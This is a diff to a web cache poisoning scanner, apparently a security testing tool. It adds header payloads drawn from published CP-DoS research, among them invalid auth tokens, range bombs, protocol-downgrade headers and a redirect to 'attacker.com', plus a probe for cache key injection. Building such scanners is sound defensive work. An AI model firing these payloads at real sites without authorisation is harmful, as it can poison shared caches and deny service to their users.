@@ -148,7 +148,38 @@ export class CachePoison {
     { name: 'x-forwarded-port-multi', value: '80', class: 'multi_cdn', desc: 'Multi-CDN: port override inner cache' },
     { name: 'x-forwarded-prefix-multi', value: '/malicious', class: 'multi_cdn', desc: 'Multi-CDN: prefix override inner cache' },
     { name: 'x-original-url-multi', value: '/internal', class: 'multi_cdn', desc: 'Multi-CDN: original URL override inner' },
-    { name: 'x-rewrite-url-multi', value: '/internal', class: 'multi_cdn', desc: 'Multi-CDN: rewrite URL override inner' }
+    { name: 'x-rewrite-url-multi', value: '/internal', class: 'multi_cdn', desc: 'Multi-CDN: rewrite URL override inner' },
+
+    // HCache CCS'24 §5.4: Internal route header CP-DoS (234 affected sites)
+    { name: 'fastly-client-ip', value: '127.0.0.1', class: 'internal_route', desc: 'HCache: Fastly internal route header' },
+    { name: 'fastly-soc-x-request-id', value: 'poisoned', class: 'internal_route', desc: 'HCache: Fastly SOC request ID injection' },
+    { name: 'x-amz-website-redirect-location', value: 'https://attacker.com', class: 'internal_route', desc: 'HCache: AWS S3 redirect location override' },
+    { name: 'x-amzn-cdn-cache', value: 'MISS', class: 'internal_route', desc: 'HCache: AWS CDN cache status override' },
+    { name: 'x-amz-cf-id', value: 'poisoned', class: 'internal_route', desc: 'HCache: CloudFront request tracing ID' },
+    { name: 'x-cdn-loop', value: 'infinite', class: 'internal_route', desc: 'HCache: CDN loop detection → 508' },
+
+    // HCache CCS'24 §5.4: Authentication header CP-DoS (118 affected sites)
+    { name: 'authorization', value: 'Bearer invalid-token-value', class: 'auth_header', desc: 'HCache: invalid Bearer token → cached 401' },
+    { name: 'x-auth-user', value: 'nonexistent', class: 'auth_header', desc: 'HCache: invalid auth user → cached 403' },
+    { name: 'auth-key', value: 'invalid', class: 'auth_header', desc: 'HCache: invalid auth key → cached 401/403' },
+    { name: 'x-api-key', value: 'invalid-key', class: 'auth_header', desc: 'HCache: invalid API key → cached 401' },
+    { name: 'x-authorization', value: 'invalid', class: 'auth_header', desc: 'HCache: X-Authorization → cached 401/403' },
+    { name: 'client-proxy-auth-required', value: 'invalid', class: 'auth_header', desc: 'HCache: proxy auth required → cached 407' },
+
+    // HCache CCS'24 Table 1: additional Range variants
+    { name: 'range', value: 'bytes=-1024,0', class: 'cpdos', desc: 'HCache: overlapping suffix-length range → 416' },
+    { name: 'range', value: 'bytes=0-,0-,0-,0-', class: 'cpdos', desc: 'HCache: multi-range bomb → 416/400' },
+
+    // HCache CCS'24 Table 1: additional Upgrade variants
+    { name: 'upgrade', value: 'HTTP/0.9', class: 'cpdos', desc: 'HCache: downgrade to HTTP/0.9 → 426' },
+    { name: 'upgrade', value: 'HTTP/2.0, SHTTP/1.3, IRC/6.9', class: 'cpdos', desc: 'HCache: multi-protocol upgrade → 426' },
+
+    // HCache CCS'24 Table 1: protocol forwarding headers
+    { name: 'x-forwarded-ssl', value: 'off', class: 'cpdos', desc: 'HCache: SSL off → redirect loop/mixed-content' },
+    { name: 'x-forwarded-protocol', value: 'nothttps', class: 'cpdos', desc: 'HCache: protocol downgrade → redirect/error' },
+
+    // HCache CCS'24 Table 1: header name case mutation (smuggling)
+    { name: 'ztransfer-encoding', value: 'asdf', class: 'cpdos', desc: 'HCache: prefixed TE case mutation → 400/502' },
   ];
 
   constructor(config: CachePoisonConfig, httpClient?: HttpClient) {
@@ -621,6 +652,9 @@ async testSingleHeader(header: string, baseline: HttpResponse): Promise<PoisonFi
 
     // 10. Fat GET (Kettle web-cache-entanglement)
     await this.testFatGET(url, baseHeaders);
+
+    // 11. Cache key injection (Kettle web-cache-entanglement §cache-key-injection)
+    await this.testCacheKeyInjection(url, baseHeaders);
   }
 
   private async testFragmentForwarding(url: string, headers: Record<string, string>): Promise<void> {
@@ -805,6 +839,37 @@ async testSingleHeader(header: string, baseline: HttpResponse): Promise<PoisonFi
         });
       }
     } catch { /* fat-GET not supported — skip */ }
+  }
+
+  /**
+   * Cache key injection (Kettle web-cache-entanglement §cache-key-injection).
+   * CDNs like Akamai use `__` and Cloudflare uses `;` as query-parameter
+   * delimiters inside their cache keys. If the origin doesn't share that
+   * delimiter, an attacker can inject extra parameters into the cache key
+   * without affecting the origin's interpretation → key collision.
+   */
+  private async testCacheKeyInjection(url: string, headers: Record<string, string>): Promise<void> {
+    const delimiters = [
+      { char: '__', cdn: 'akamai' },
+      { char: ';', cdn: 'cloudflare' },
+      { char: '|', cdn: 'generic' },
+    ];
+    const canary = this.generateCanary();
+
+    for (const { char, cdn } of delimiters) {
+      try {
+        const injected = `${url}${url.includes('?') ? '&' : '?'}legit=1${char}injected=${canary}`;
+        const resp = await this.http.get(injected, headers);
+        if (resp.status === 200 && resp.body.includes(canary)) {
+          this.findings.push({
+            inputType: 'query', inputName: `cache-key-injection-${cdn}`, canary,
+            signals: { bodyReflection: true, headerReflection: {}, statusChanged: false, sizeDeltaPercent: 0, newHeaders: [], securityHeaderChanges: {} },
+            oracle: {} as any, classification: 'behaviour_poisoning', attackClass: 'content_poison', confidence: 'LIKELY',
+            blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
+          });
+        }
+      } catch { /* delimiter not processed — skip */ }
+    }
   }
 
   private generateCanary(): string {
